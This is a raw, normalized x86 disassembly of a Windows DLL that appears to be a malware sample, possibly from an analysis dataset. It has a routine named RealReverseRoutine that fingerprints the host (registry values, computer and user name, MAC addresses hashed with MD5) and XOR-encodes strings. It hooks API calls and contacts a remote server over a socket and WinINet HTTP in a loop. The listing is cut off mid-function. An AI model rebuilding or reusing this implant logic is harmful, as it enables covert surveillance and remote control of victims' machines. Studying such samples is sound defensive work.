sub_1000101d
push esi
mov esi [ GetTickCount@IAT ]
push edi
call esi
push [ esp + 0x10 ]
mov edi eax
push [ esp + 0x10 ]
call [ rw-data ]
call esi
sub eax edi
push eax
push rw-data
call [ InterlockedExchangeAdd@IAT ]
pop edi
pop esi
retn 0x8
sub_10001065
push rw-data
push rw-data
call sub_10003813
mov [ rw-data ] eax
call sub_10002c09
call [ GetCurrentThread@IAT ]
push eax
call sub_10002fcd
push sub_1000101d
push rw-data
call sub_1000303c
call sub_10002d6f
test eax eax
jne r-xdata
push eax
push rw-data
call printf
pop ecx
push rw-data
call printf
jmp r-xdata
pop ecx
call ?RealReverseRoutine@@YGHXZ
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call [ rw-data ]
retn 0x10
sub_100010d9
cmp [ esp + 0x8 ] 0x1
jne r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
call sub_10003ebc
push 0x0
call sub_10003acf
mov [ rw-data ] eax
mov [ rw-data ] eax
call sub_10002c09
call [ GetCurrentThread@IAT ]
push eax
call sub_10002fcd
push sub_1000104c
push rw-data
call sub_1000303c
push sub_10001065
push rw-data
call sub_1000303c
jmp r-xdata
push 0x1
pop eax
retn 0xc
call sub_10002c09
call [ GetCurrentThread@IAT ]
push eax
call sub_10002fcd
cmp [ rw-data ] 0x0
je r-xdata
call sub_10002d6f
push sub_1000104c
push rw-data
call sub_10003571
push sub_10001065
push rw-data
call sub_10003571
push sub_1000101d
push rw-data
call sub_10003571
?RealReverseRoutine@@YGHXZ
mov eax sub_100042e0
call _EH_prolog
push ecx
mov eax 0x18cc
call sub_10002970
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] esp
push rw-data
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x4 ] ebx
call sub_10001b05
pop ecx
push rw-data
call sub_10001b05
pop ecx
push rw-data
call sub_10001b05
pop ecx
push rw-data
call sub_10001b05
pop ecx
push rw-data
call sub_10001b05
pop ecx
push rw-data
call sub_10001b05
pop ecx
push rw-data
call sub_10001b05
pop ecx
push rw-data
call sub_10001b05
pop ecx
mov edi rw-data
push edi
call sub_10001b05
pop ecx
mov esi rw-data
push esi
call sub_10001b05
pop ecx
mov [ rw-data ] 0x50
push rw-data
mov [ rw-data ] ebx
call atoi
lea eax [ eax + eax * 4 ]
push edi
shl eax 0x1
mov [ rw-data ] eax
mov [ rw-data ] eax
call atoi
lea eax [ eax + eax * 4 ]
push esi
shl eax 0x1
mov [ rw-data ] eax
mov [ rw-data ] eax
call atoi
add esp 0xc
imul eax eax 0x3e8
mov [ rw-data ] eax
mov [ rw-data ] ebx
mov [ ebp - 0x18 ] ebx
push 0x64
call [ Sleep@IAT ]
jmp r-xdata
push ebx
push ebx
lea eax [ ebp - 0x84 ]
push ebx
push eax
call [ GetMessageA@IAT ]
mov esi rw-data
push edi
push esi
call [ InitializeSecurityDescriptor@IAT ]
push ebx
push ebx
push edi
push esi
call [ SetSecurityDescriptorDacl@IAT ]
push [ rw-data ]
mov [ rw-data ] esi
mov esi rw-data
mov [ rw-data ] 0xc
push rw-data
push esi
mov [ rw-data ] edi
call sprintf
add esp 0xc
push esi
push ebx
push ebx
call [ CreateMutexA@IAT ]
mov esi [ GetLastError@IAT ]
mov [ rw-data ] eax
call esi
cmp eax 0xb7
je r-xdata
push 0x1
pop edi
push edi
call _sleep
pop ecx
push ebx
push ebx
push ebx
call [ GetCurrentThreadId@IAT ]
push eax
call [ PostThreadMessageA@IAT ]
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
xor eax eax
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
call esi
cmp eax 0x5
je r-xdata
push [ rw-data ]
call _sleep
mov esi rw-data
push esi
call sub_10001b05
pop ecx
pop ecx
push esi
call strlen
mov edi eax
push edi
push esi
call sub_10001ada
push edi
push esi
call sub_100027d4
add esp 0x14
mov [ rw-data ] eax
lea eax [ ebp - 0x1c ]
push eax
push 0x20019
push ebx
push rw-data
push 0x80000002
call [ RegOpenKeyExA@IAT ]
test eax eax
mov edi 0x400
jne r-xdata
mov esi [ RegQueryValueExA@IAT ]
push edi
lea eax [ ebp - 0x4dc ]
push ebx
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x14 ]
mov esi [ RegQueryValueExA@IAT ]
mov [ ebp - 0x14 ] edi
push eax
lea eax [ ebp - 0x4dc ]
push eax
lea eax [ ebp - 0x24 ]
push eax
push ebx
push rw-data
push [ ebp - 0x1c ]
call esi
test eax eax
je r-xdata
push rw-data
push edi
lea eax [ ebp - 0x4dc ]
push ebx
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x14 ]
mov [ ebp - 0x14 ] edi
push eax
lea eax [ ebp - 0x4dc ]
push eax
lea eax [ ebp - 0x24 ]
push eax
push ebx
push rw-data
push [ ebp - 0x1c ]
call esi
test eax eax
jne r-xdata
lea eax [ ebp - 0x4dc ]
lea edx [ ebp - 0x4dc ]
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x4dc ]
push eax
lea eax [ ebp - 0x24 ]
push eax
push ebx
push rw-data
push [ ebp - 0x1c ]
call esi
test eax eax
je r-xdata
push [ ebp - 0x1c ]
call [ RegCloseKey@IAT ]
push 0x7f
lea eax [ ebp - 0x14 ]
pop esi
push eax
push rw-data
mov [ ebp - 0x14 ] esi
call [ GetComputerNameA@IAT ]
lea eax [ ebp - 0x14 ]
mov [ ebp - 0x14 ] esi
push eax
push rw-data
call [ GetUserNameA@IAT ]
call sub_100019f4
cmp [ rw-data ] bl
je r-xdata
push [ ebp - 0x14 ]
lea eax [ ebp - 0x4dc ]
push ebx
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x14 ]
mov [ ebp - 0x14 ] edi
push eax
lea eax [ ebp - 0x24 ]
push rw-data
push eax
push ebx
push rw-data
push [ ebp - 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ ebp - 0x4dc ]
push eax
jmp r-xdata
mov cl [ eax ]
cmp cl bl
je r-xdata
cmp cl 0x20
je r-xdata
mov [ ebp - 0x4dc ] bl
mov edi 0x280
push edi
call malloc
mov esi eax
pop ecx
lea eax [ ebp - 0x34 ]
mov [ ebp - 0x34 ] edi
push eax
push esi
call GetAdaptersInfo
cmp eax 0x6f
jne r-xdata
lea eax [ ebp - 0xdc ]
push eax
call sub_10001de4
mov esi rw-data
push esi
call strlen
push eax
lea eax [ ebp - 0xdc ]
push esi
push eax
call sub_10001e1b
lea eax [ ebp - 0xdc ]
push eax
lea eax [ ebp - 0x68 ]
push eax
call sub_10001ebd
add esp 0x1c
xor esi esi
xor edi edi
push [ ebp - 0x14 ]
lea eax [ ebp - 0x4dc ]
push ebx
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x14 ]
mov [ ebp - 0x14 ] edi
push eax
lea eax [ ebp - 0x24 ]
push rw-data
push eax
push ebx
push rw-data
push [ ebp - 0x1c ]
call esi
cmp eax ebx
je r-xdata
mov [ rw-data ] bl
call _strdup
pop ecx
mov [ rw-data ] eax
push [ ebp - 0x1c ]
call [ RegCloseKey@IAT ]
lea eax [ ebp - 0x1c ]
push eax
push 0x20019
push ebx
push rw-data
push 0x80000002
call [ RegOpenKeyExA@IAT ]
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x4dc ]
mov [ edx ] bl
push eax
call _strdup
pop ecx
mov [ rw-data ] eax
jmp r-xdata
mov [ edx ] cl
inc edx
inc eax
jmp r-xdata
inc eax
jmp r-xdata
cmp cl 0x9
jne r-xdata
lea eax [ ebp - 0x34 ]
push eax
push esi
call GetAdaptersInfo
test eax eax
jne r-xdata
push esi
call free
push [ ebp - 0x34 ]
call malloc
pop ecx
mov esi eax
pop ecx
mov [ rw-data ] bl
movzx eax [ ebp + esi - 0x68 ]
push eax
push rw-data
lea eax [ edi + rw-data ]
push 0x20
push eax
call _snprintf
add esp 0x10
inc esi
inc edi
inc edi
jmp r-xdata
push [ ebp - 0x14 ]
lea eax [ ebp - 0x4dc ]
push ebx
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x14 ]
mov [ ebp - 0x14 ] edi
mov edi rw-data
push eax
lea eax [ ebp - 0x24 ]
push edi
push eax
push ebx
push rw-data
push [ ebp - 0x1c ]
call esi
cmp eax ebx
je r-xdata
push [ ebp - 0x1c ]
call [ RegCloseKey@IAT ]
lea eax [ ebp - 0x1c ]
push eax
push 0x20019
push ebx
push rw-data
push 0x80000002
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
mov cl [ eax ]
cmp cl bl
je r-xdata
lea eax [ ebp - 0x8dc ]
push rw-data
push eax
call sprintf
pop ecx
pop ecx
mov [ ebp - 0x8dc ] bl
cmp esi 0x10
jge r-xdata
mov esi 0x1000
lea eax [ ebp - 0x18dc ]
push esi
push ebx
push eax
call memset
push edi
push rw-data
lea eax [ ebp - 0x18dc ]
push esi
push eax
call _snprintf
lea eax [ ebp - 0x18dc ]
push eax
call strlen
push eax
lea eax [ ebp - 0x18dc ]
push eax
push edi
call strncpy
add esp 0x2c
cmp [ ebp - 0x30 ] ebx
jne r-xdata
lea eax [ ebp - 0x54 ]
push 0x10
push eax
push [ ebp - 0x2c ]
call [ bind@IAT ]
cmp eax 0xffffffff
je r-xdata
push rw-data
push rw-data
call strcpy
mov edi rw-data
push rw-data
push edi
call strcpy
add esp 0x10
push 0x6
push 0x1
push 0x2
call [ socket@IAT ]
push rw-data
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x54 ] 0x2
call [ inet_addr@IAT ]
push 0x2654
mov [ ebp - 0x50 ] eax
call [ htons@IAT ]
mov [ ebp - 0x52 ] ax
lea eax [ esi + 0x1b0 ]
push eax
lea eax [ ebp - 0x8dc ]
push eax
call strcat
lea eax [ ebp - 0x8dc ]
push rw-data
push eax
call strcat
mov esi [ esi ]
add esp 0x10
jmp r-xdata
push [ ebp - 0x18 ]
mov esi rw-data
push rw-data
push [ rw-data ]
push rw-data
push rw-data
push esi
call sprintf
add esp 0x18
cmp [ ebp - 0x18 ] ebx
je r-xdata
mov [ ebp - 0x20 ] ebx
push [ ebp - 0x2c ]
call [ closesocket@IAT ]
cmp esi ebx
je r-xdata
push 0x1
push [ rw-data ]
push rw-data
push ebx
push esi
call sub_10001bab
add esp 0x14
cmp eax ebx
mov [ ebp - 0x18 ] eax
je r-xdata
push [ ebp - 0x18 ]
call free
pop ecx
mov ecx [ ebp - 0x38 ]
lea eax [ ebp - 0x8dc ]
push rw-data
push eax
mov eax [ ebp - 0x3c ]
push 0x3
add eax ecx
xor edx edx
add eax [ ebp - 0x40 ]
pop esi
div esi
mov esi rw-data
push eax
push ecx
push [ ebp - 0x3c ]
push [ ebp - 0x40 ]
push rw-data
push rw-data
push [ rw-data ]
push [ rw-data ]
push rw-data
push rw-data
push rw-data
push esi
call sprintf
push esi
call _strdup
mov esi eax
push esi
call strlen
add esp 0x40
mov [ rw-data ] eax
push eax
push esi
call sub_10001ada
push [ rw-data ]
push esi
call sub_100027d4
add esp 0x10
cmp esi ebx
mov [ ebp - 0x20 ] eax
je r-xdata
call [ GetTickCount@IAT ]
push 0x1
lea esi [ ebp + esi * 4 - 0x44 ]
push [ rw-data ]
mov [ ebp - 0x28 ] eax
mov [ esi ] eax
push rw-data
push ebx
push edi
call sub_10001bab
add esp 0x14
cmp eax ebx
mov [ ebp - 0x18 ] eax
je r-xdata
push 0x1
push [ rw-data ]
push rw-data
push ebx
push esi
call sub_10001bab
add esp 0x14
mov [ ebp - 0x18 ] eax
push rw-data
push eax
call strstr
pop ecx
test eax eax
pop ecx
jne r-xdata
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
push esi
call free
pop ecx
mov [ esi ] 0x270f
push rw-data
push eax
call strstr
pop ecx
test eax eax
pop ecx
je r-xdata
call rand
mov esi [ rw-data ]
mov ecx [ rw-data ]
sub esi ecx
xor edx edx
div esi
push rw-data
add edx ecx
mov [ rw-data ] edx
call _strdup
mov esi eax
push esi
call strlen
push eax
push esi
mov [ rw-data ] eax
call sub_10001ada
push [ rw-data ]
push esi
call sub_100027d4
add esp 0x18
cmp esi ebx
mov [ ebp - 0x20 ] eax
je r-xdata
push [ ebp - 0x18 ]
call free
pop ecx
cmp [ ebp - 0x18 ] ebx
je r-xdata
inc [ ebp - 0x20 ]
jmp r-xdata
call [ GetTickCount@IAT ]
push 0x1
mov [ ebp - 0x28 ] eax
push [ rw-data ]
mov [ esi ] eax
push rw-data
push ebx
push edi
call sub_10001bab
add esp 0x14
cmp eax ebx
mov [ ebp - 0x18 ] eax
je r-xdata
mov [ esi ] 0x270f
call [ GetTickCount@IAT ]
sub eax [ ebp - 0x28 ]
mov [ ebp - 0x30 ] 0x1
mov [ esi ] eax
jmp r-xdata
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov eax [ rw-data ]
imul eax eax 0x64
push eax
call _sleep
pop ecx
push 0xffffffff
push 0xffffffff
call [ GetCurrentProcess@IAT ]
push eax
call [ SetProcessWorkingSetSize@IAT ]
jmp r-xdata
push esi
call free
pop ecx
mov esi [ ebp - 0x20 ]
cmp esi 0x4
jge r-xdata
mov [ esi ] 0x270f
push rw-data
push eax
call strstr
pop ecx
test eax eax
pop ecx
je r-xdata
cmp [ esi ] 0x270f
jne r-xdata
push [ ebp - 0x18 ]
call free
pop ecx
jmp r-xdata
cmp [ ebp - 0x2c ] 0xffffffff
je r-xdata
mov [ esi ] 0x270f
call [ GetTickCount@IAT ]
sub eax [ ebp - 0x28 ]
mov [ ebp - 0x30 ] 0x1
mov [ esi ] eax
jmp r-xdata
push [ ebp - 0x18 ]
call free
pop ecx
jmp r-xdata
sub_100019f4
push ebp
mov ebp esp
mov eax 0x14020
call sub_10002970
and [ ebp - 0xc ] 0x0
push ebx
push edi
mov ebx rw-data
push rw-data
push ebx
call sprintf
pop ecx
lea eax [ ebp - 0x10 ]
pop ecx
mov [ ebp - 0x10 ] 0x14000
push eax
lea eax [ ebp - 0x14020 ]
push eax
call GetAdaptersInfo
mov ecx eax
xor eax eax
lea edi [ ebp - 0x8 ]
stosd [ edi ]
test ecx ecx
stosw [ edi ]
jne r-xdata
pop edi
pop ebx
leave
retn
push esi
lea esi [ ebp - 0x14020 ]
mov edi rw-data
mov cl [ esi + eax + 0x194 ]
xor [ ebp + eax - 0x8 ] cl
inc eax
cmp eax 0x6
jl r-xdata
mov esi [ esi ]
inc [ ebp - 0xc ]
test esi esi
je r-xdata
movzx eax [ ebp - 0x3 ]
push eax
movzx eax [ ebp - 0x4 ]
push eax
movzx eax [ ebp - 0x5 ]
push eax
movzx eax [ ebp - 0x6 ]
push eax
movzx eax [ ebp - 0x7 ]
push eax
movzx eax [ ebp - 0x8 ]
push eax
push edi
push ebx
call sprintf
add esp 0x20
pop esi
cmp [ ebp - 0xc ] 0xa
jl r-xdata
movzx eax [ esi + 0x199 ]
push eax
movzx eax [ esi + 0x198 ]
push eax
movzx eax [ esi + 0x197 ]
push eax
movzx eax [ esi + 0x196 ]
push eax
movzx eax [ esi + 0x195 ]
push eax
movzx eax [ esi + 0x194 ]
push eax
lea eax [ ebp - 0x20 ]
push edi
push eax
call sprintf
add esp 0x20
xor eax eax
sub_10001ada
mov eax [ esp + 0x4 ]
push esi
push edi
mov edi [ esp + 0x10 ]
mov esi rw-data
test edi edi
mov ecx esi
jle r-xdata
pop edi
pop esi
retn
cmp [ ecx ] 0x0
jne r-xdata
mov dl [ ecx ]
add dl 0x17
xor [ eax ] dl
inc ecx
inc eax
dec edi
jne r-xdata
mov ecx esi
sub_10001b05
push ebp
mov ebp esp
sub esp 0x14
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0x13 ] 0x1
mov [ ebp - 0x12 ] 0x2
mov [ ebp - 0x11 ] 0x10
mov [ ebp - 0x10 ] 0x4
mov [ ebp - 0xf ] 0x4
mov [ ebp - 0xe ] 0x8
mov [ ebp - 0xd ] 0x8
mov [ ebp - 0xc ] 0x10
mov [ ebp - 0xb ] 0x2
mov [ ebp - 0xa ] 0x20
mov [ ebp - 0x9 ] 0x40
mov [ ebp - 0x8 ] 0x40
mov [ ebp - 0x7 ] 0x20
mov [ ebp - 0x6 ] 0x80
mov [ ebp - 0x5 ] 0x80
call strlen
xor edi edi
pop ecx
test eax eax
mov [ ebp - 0x4 ] eax
jle r-xdata
push esi
call strlen
pop ecx
push ebx
and [ eax + esi + 0x1 ] 0x0
pop edi
pop esi
leave
retn
test eax eax
jg r-xdata
mov al [ ecx ]
not al
and dl al
or dl [ ecx ]
jmp r-xdata
dec eax
cmp [ eax + esi ] 0x20
jne r-xdata
test [ ecx - 0x1 ] bl
je r-xdata
mov [ edi + esi ] dl
inc edi
cmp edi [ ebp - 0x4 ]
jl r-xdata
inc ecx
inc ecx
dec [ ebp + 0x8 ]
jne r-xdata
mov bl [ edi + esi ]
xor dl dl
lea ecx [ ebp - 0x13 ]
mov [ ebp + 0x8 ] 0x8
pop ebx
sub_10001bab
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push 0x4
pop eax
xor ebx ebx
push ebx
push ebx
push ebx
push eax
push rw-data
mov [ ebp - 0x10 ] eax
call [ InternetOpenA@IAT ]
cmp eax ebx
mov [ ebp - 0x8 ] eax
je r-xdata
xor eax eax
push ebx
push ebx
push 0x3
push ebx
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
call [ InternetConnectA@IAT ]
mov ecx eax
cmp ecx ebx
mov [ ebp + 0x14 ] ecx
je r-xdata
push [ ebp - 0x8 ]
call [ InternetCloseHandle@IAT ]
mov eax ebx
jmp r-xdata
mov eax [ ebp + 0x18 ]
dec eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push ebx
push 0x4400100
push ebx
push ebx
push ebx
push [ ebp + 0x8 ]
push rw-data
push ecx
call [ HttpOpenRequestA@IAT ]
cmp eax ebx
mov [ ebp + 0x8 ] eax
je r-xdata
dec eax
jne r-xdata
push [ ebp + 0x14 ]
call [ InternetCloseHandle@IAT ]
mov esi [ HttpSendRequestA@IAT ]
push ebx
push ebx
push ebx
push ebx
mov [ rw-data ] ebx
push eax
mov esi [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
lea eax [ ebp - 0xc ]
push eax
push 0x20000013
push esi
call [ HttpQueryInfoA@IAT ]
mov eax [ ebp - 0xc ]
cmp eax 0x197
je r-xdata
push ebx
push 0x4400100
push ebx
push ebx
push ebx
push [ ebp + 0x8 ]
push rw-data
push ecx
call [ HttpOpenRequestA@IAT ]
cmp eax ebx
mov [ ebp + 0x8 ] eax
je r-xdata
cmp [ rw-data ] 0x3
jge r-xdata
push [ rw-data ]
call _sleep
cmp esi ebx
pop ecx
je r-xdata
push 0x400
mov [ rw-data ] eax
call malloc
pop ecx
mov edi eax
xor esi esi
mov edi [ ebp + 0xc ]
mov [ rw-data ] ebx
push edi
call strlen
mov esi [ HttpSendRequestA@IAT ]
pop ecx
push eax
push edi
push ebx
push ebx
push [ ebp + 0x8 ]
call [ GetLastError@IAT ]
cmp eax 0x2ee2
jne r-xdata
call [ GetLastError@IAT ]
xor eax eax
jmp r-xdata
cmp edi ebx
mov [ rw-data ] ebx
je r-xdata
cmp [ ebp - 0x4 ] ebx
je r-xdata
cmp [ rw-data ] 0x3
jge r-xdata
inc [ rw-data ]
push ebx
push ebx
push ebx
push ebx
push [ ebp + 0x8 ]
jmp r-xdata
push ebx
push 0x7
push eax
push esi
call [ GetDesktopWindow@IAT ]
push eax
call [ InternetErrorDlg@IAT ]
push esi
mov esi [ InternetCloseHandle@IAT ]
call esi
push [ ebp + 0x14 ]
call esi
push [ ebp - 0x8 ]
call esi
mov eax [ ebp - 0xc ]
mov [ rw-data ] 0x1
mov [ rw-data ] eax
push [ ebp + 0x8 ]
call [ InternetCloseHandle@IAT ]
push edi
call free
pop ecx
jmp r-xdata
mov [ esi + edi ] bl
mov [ rw-data ] esi
mov ebx edi
add esi [ ebp - 0x4 ]
lea eax [ esi + 0x400 ]
push eax
push edi
call realloc
pop ecx
mov edi eax
pop ecx
jmp r-xdata
call [ GetLastError@IAT ]
cmp eax 0x2ee2
jne r-xdata
call esi
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea eax [ esi + edi ]
push 0x3ff
push eax
push [ ebp + 0x8 ]
call [ InternetReadFile@IAT ]
test eax eax
je r-xdata
inc [ rw-data ]
push edi
call strlen
pop ecx
push eax
push edi
push ebx
push ebx
push [ ebp + 0x8 ]
jmp r-xdata
call esi
test eax eax
jne r-xdata
sub_10001de4
mov eax [ esp + 0x4 ]
xor ecx ecx
push 0x40
push ecx
mov [ eax ] 0x67452301
mov [ eax + 0x4 ] 0xefcdab89
mov [ eax + 0x8 ] 0x98badcfe
mov [ eax + 0xc ] 0x10325476
mov [ eax + 0x10 ] ecx
mov [ eax + 0x14 ] ecx
add eax 0x18
push eax
call memset
add esp 0xc
retn
sub_10001e1b
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
push edi
mov eax [ esi + 0x10 ]
lea ecx [ eax + ebx * 8 ]
cmp ecx eax
mov [ esi + 0x10 ] ecx
jae r-xdata
mov ecx ebx
shr ecx 0x1d
add [ esi + 0x14 ] ecx
shr eax 0x3
and eax 0x3f
je r-xdata
inc [ esi + 0x14 ]
cmp ebx 0x40
jb r-xdata
push 0x40
lea ecx [ eax + esi + 0x18 ]
pop edi
sub edi eax
cmp ebx edi
jae r-xdata
push ebx
add esi 0x18
push [ ebp + 0xc ]
push esi
mov edi ebx
shr edi 0x6
push edi
push [ ebp + 0xc ]
push ecx
call memcpy
lea eax [ esi + 0x18 ]
push esi
push eax
push esi
call sub_10001feb
add [ ebp + 0xc ] edi
add esp 0x18
sub ebx edi
push ebx
push [ ebp + 0xc ]
push ecx
jmp r-xdata
push 0x40
lea eax [ esi + 0x18 ]
push [ ebp + 0xc ]
push eax
call memcpy
lea eax [ esi + 0x18 ]
push esi
push eax
push esi
call sub_10001feb
add [ ebp + 0xc ] 0x40
add esp 0x18
sub ebx 0x40
dec edi
jne r-xdata
call memcpy
add esp 0xc
pop edi
pop esi
pop ebx
pop ebp
retn
sub_10001ebd
push esi
mov esi [ esp + 0xc ]
push 0x3f
mov eax [ esi + 0x10 ]
pop ecx
shr eax 0x3
and eax ecx
sub ecx eax
lea edx [ eax + esi + 0x18 ]
mov [ edx ] 0x80
inc edx
cmp ecx 0x8
jae r-xdata
add ecx 0xfffffff8
push ecx
push 0x0
push edx
call memset
add esp 0xc
push edi
push ecx
push 0x0
push edx
call memset
lea edi [ esi + 0x18 ]
push esi
push edi
push esi
call sub_10001feb
push 0x38
push 0x0
push edi
call memset
add esp 0x24
pop edi
jmp r-xdata
mov al [ esi + 0x10 ]
push esi
mov [ esi + 0x50 ] al
mov eax [ esi + 0x10 ]
mov ecx eax
shr ecx 0x8
mov [ esi + 0x51 ] cl
mov ecx eax
shr eax 0x18
mov [ esi + 0x53 ] al
mov al [ esi + 0x14 ]
shr ecx 0x10
mov [ esi + 0x54 ] al
mov eax [ esi + 0x14 ]
mov [ esi + 0x52 ] cl
mov ecx eax
shr ecx 0x8
mov [ esi + 0x55 ] cl
mov ecx eax
shr eax 0x18
mov [ esi + 0x57 ] al
lea eax [ esi + 0x18 ]
shr ecx 0x10
push eax
push esi
mov [ esi + 0x56 ] cl
call sub_10001feb
mov eax [ esp + 0x14 ]
mov cl [ esi ]
push 0x4
push 0x0
mov [ eax ] cl
mov ecx [ esi ]
shr ecx 0x8
mov [ eax + 0x1 ] cl
mov ecx [ esi ]
shr ecx 0x10
mov [ eax + 0x2 ] cl
mov ecx [ esi ]
shr ecx 0x18
mov [ eax + 0x3 ] cl
mov dl [ esi + 0x4 ]
lea ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] dl
push esi
mov edx [ ecx ]
shr edx 0x8
mov [ eax + 0x5 ] dl
mov edx [ ecx ]
shr edx 0x10
mov [ eax + 0x6 ] dl
mov ecx [ ecx ]
shr ecx 0x18
mov [ eax + 0x7 ] cl
mov dl [ esi + 0x8 ]
lea ecx [ esi + 0x8 ]
mov [ eax + 0x8 ] dl
mov edx [ ecx ]
shr edx 0x8
mov [ eax + 0x9 ] dl
mov edx [ ecx ]
shr edx 0x10
mov [ eax + 0xa ] dl
mov ecx [ ecx ]
shr ecx 0x18
mov [ eax + 0xb ] cl
mov dl [ esi + 0xc ]
lea ecx [ esi + 0xc ]
mov [ eax + 0xc ] dl
mov edx [ ecx ]
shr edx 0x8
mov [ eax + 0xd ] dl
mov edx [ ecx ]
shr edx 0x10
mov [ eax + 0xe ] dl
mov ecx [ ecx ]
shr ecx 0x18
mov [ eax + 0xf ] cl
call memset
add esp 0x18
pop esi
retn
sub_10001feb
push ebp
mov ebp esp
sub esp 0x40
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
push 0x10
lea ecx [ ebp - 0x40 ]
add eax 0x2
pop esi
movzx edi [ eax - 0x1 ]
xor edx edx
mov dh [ eax + 0x1 ]
mov dl [ eax ]
add eax 0x4
shl edx 0x8
or edx edi
movzx edi [ eax - 0x6 ]
shl edx 0x8
or edx edi
mov [ ecx ] edx
add ecx 0x4
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax + 0xc ]
mov edi [ eax + 0x8 ]
mov ebx [ eax + 0x4 ]
mov ecx [ eax ]
mov edx esi
xor edx edi
and edx ebx
xor edx esi
add edx ecx
mov ecx [ ebp - 0x40 ]
lea edx [ edx + ecx - 0x28955b88 ]
mov ecx edx
shr ecx 0x19
shl edx 0x7
or ecx edx
mov edx edi
add ecx ebx
xor edx ebx
and edx ecx
xor edx edi
add edx [ ebp - 0x3c ]
lea esi [ esi + edx - 0x173848aa ]
mov edx esi
shr edx 0x14
shl esi 0xc
or edx esi
mov esi ebx
add edx ecx
xor esi ecx
and esi edx
xor esi ebx
mov ebx edx
add esi [ ebp - 0x38 ]
xor ebx ecx
lea edi [ edi + esi + 0x242070db ]
mov esi edi
shr esi 0xf
shl edi 0x11
or esi edi
mov edi [ eax + 0x4 ]
add esi edx
and ebx esi
xor ebx ecx
add ebx [ ebp - 0x34 ]
lea edi [ edi + ebx - 0x3e423112 ]
mov ebx edi
shl ebx 0x16
shr edi 0xa
or ebx edi
mov edi edx
add ebx esi
xor edi esi
and edi ebx
mov [ ebp + 0xc ] ebx
xor edi edx
add edi [ ebp - 0x30 ]
lea ecx [ ecx + edi - 0xa83f051 ]
mov edi ecx
shr edi 0x19
shl ecx 0x7
or edi ecx
mov ecx esi
add edi ebx
xor ecx ebx
and ecx edi
xor ecx esi
add ecx [ ebp - 0x2c ]
lea edx [ edx + ecx + 0x4787c62a ]
mov ecx edx
shr ecx 0x14
shl edx 0xc
or ecx edx
mov edx ebx
add ecx edi
xor edx edi
and edx ecx
xor edx ebx
add edx [ ebp - 0x28 ]
lea esi [ esi + edx - 0x57cfb9ed ]
mov edx esi
shr edx 0xf
shl esi 0x11
or edx esi
mov esi ecx
add edx ecx
xor esi edi
and esi edx
xor esi edi
add esi [ ebp - 0x24 ]
lea esi [ ebx + esi - 0x2b96aff ]
mov ebx esi
shl ebx 0x16
shr esi 0xa
or ebx esi
mov esi ecx
xor esi edx
add ebx edx
and esi ebx
mov [ ebp + 0xc ] ebx
xor esi ecx
add esi [ ebp - 0x20 ]
lea edi [ edi + esi + 0x698098d8 ]
mov esi edi
shr esi 0x19
shl edi 0x7
or esi edi
mov edi edx
add esi ebx
xor edi ebx
and edi esi
xor edi edx
add edi [ ebp - 0x1c ]
lea ecx [ ecx + edi - 0x74bb0851 ]
mov edi ecx
shr edi 0x14
shl ecx 0xc
or edi ecx
mov ecx ebx
add edi esi
xor ecx esi
and ecx edi
xor ecx ebx
add ecx [ ebp - 0x18 ]
lea edx [ edx + ecx - 0xa44f ]
mov ecx edx
shr ecx 0xf
shl edx 0x11
or ecx edx
mov edx edi
add ecx edi
xor edx esi
and edx ecx
xor edx esi
add edx [ ebp - 0x14 ]
lea edx [ ebx + edx - 0x76a32842 ]
mov ebx edx
shl ebx 0x16
shr edx 0xa
or ebx edx
mov edx edi
add ebx ecx
xor edx ecx
and edx ebx
mov [ ebp + 0xc ] ebx
xor edx edi
add edx [ ebp - 0x10 ]
lea esi [ esi + edx + 0x6b901122 ]
mov edx esi
shr edx 0x19
shl esi 0x7
or edx esi
mov esi ecx
add edx ebx
xor esi ebx
and esi edx
xor esi ecx
add esi [ ebp - 0xc ]
lea edi [ edi + esi - 0x2678e6d ]
mov ebx edi
shr ebx 0x14
shl edi 0xc
or ebx edi
mov edi [ ebp + 0xc ]
mov esi edi
add ebx edx
xor esi edx
and esi ebx
xor esi edi
add esi [ ebp - 0x8 ]
lea ecx [ ecx + esi - 0x5986bc72 ]
mov esi ecx
shr esi 0xf
shl ecx 0x11
or esi ecx
mov ecx ebx
add esi ebx
xor ecx edx
and ecx esi
xor ecx edx
add ecx [ ebp - 0x4 ]
lea edi [ edi + ecx + 0x49b40821 ]
mov ecx edi
shl ecx 0x16
shr edi 0xa
or ecx edi
mov edi esi
add ecx esi
xor edi ecx
and edi ebx
xor edi esi
add edi [ ebp - 0x3c ]
lea edx [ edx + edi - 0x9e1da9e ]
mov edi edx
shr edi 0x1b
shl edx 0x5
or edi edx
mov edx ecx
add edi ecx
xor edx edi
and edx esi
xor edx ecx
add edx [ ebp - 0x28 ]
lea ebx [ ebx + edx - 0x3fbf4cc0 ]
mov edx ebx
shr edx 0x17
